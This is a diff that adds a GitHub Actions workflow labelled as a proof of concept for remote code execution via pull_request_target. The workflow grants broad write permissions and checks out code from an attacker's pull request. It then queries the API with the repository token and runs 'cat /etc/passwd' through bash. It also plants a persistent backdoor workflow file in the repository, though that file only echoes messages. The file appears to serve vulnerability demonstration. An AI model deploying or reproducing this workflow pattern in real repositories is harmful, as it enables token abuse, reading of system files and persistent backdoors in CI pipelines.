@@ -1,0 +1,74 @@
+name: "POC - RCE via pull_request_target"
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  actions: write
+  contents: write
+  pull-requests: write
+  statuses: write
+
+jobs:
+  demonstrate-rce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - Checkout attacker's code from PR
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          
+      - name: Step 2 - Show we have access to attacker's files
+        run: |
+          echo "=== ACCESSING ATTACKER-CONTROLLED FILES ==="
+          ls -la
+          echo "Files in PR:"
+          find . -type f -name "*" | head -20
+          
+      - name: Step 3 - Demonstrate secret access capabilities
+        run: |
+          echo "=== SECRET ACCESS DEMONSTRATION ==="
+          echo "GITHUB_TOKEN has permissions:"
+          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}" | \
+            jq '{permissions, full_name, private}'
+            
+      - name: Step 4 - Demonstrate repository modification
+        run: |
+          echo "=== REPOSITORY MODIFICATION PROOF ==="
+          date > rce-proof-${{ github.run_id }}.txt
+          echo "Repository: ${{ github.repository }}" >> rce-proof-${{ github.run_id }}.txt
+          echo "Created file: rce-proof-${{ github.run_id }}.txt"
+          
+      - name: Step 5 - Show we can execute arbitrary code
+        run: |
+          echo "=== ARBITRARY CODE EXECUTION ==="
+          # If attacker included a malicious script, we could execute it here
+          if [ -f "attack.sh" ]; then
+            echo "MALICIOUS SCRIPT FOUND - WOULD EXECUTE:"
+            cat attack.sh
+            # bash attack.sh  # This would execute attacker's code
+          else
+            echo "Simulating malicious code execution..."
+            echo "cat /etc/passwd" | bash
+          fi
+          
+      - name: Step 6 - Demonstrate workflow injection capability
+        run: |
+          echo "=== WORKFLOW INJECTION CAPABILITY ==="
+          mkdir -p .github/workflows
+          cat > .github/workflows/poc-backdoor.yml << 'EOF'
+          name: Backdoor POC
+          on: [push, workflow_dispatch]
+          jobs:
+            backdoor:
+              runs-on: ubuntu-latest
+              steps:
+                - name: Prove backdoor works
+                  run: |
+                    echo "BACKDOOR ACTIVATED - Full repository access achieved!"
+                    echo "Run ID: ${{ github.run_id }}"
+                    echo "This could exfiltrate data or modify production code"
+          EOF
+          echo "Backdoor workflow created - this persists in the repository!"
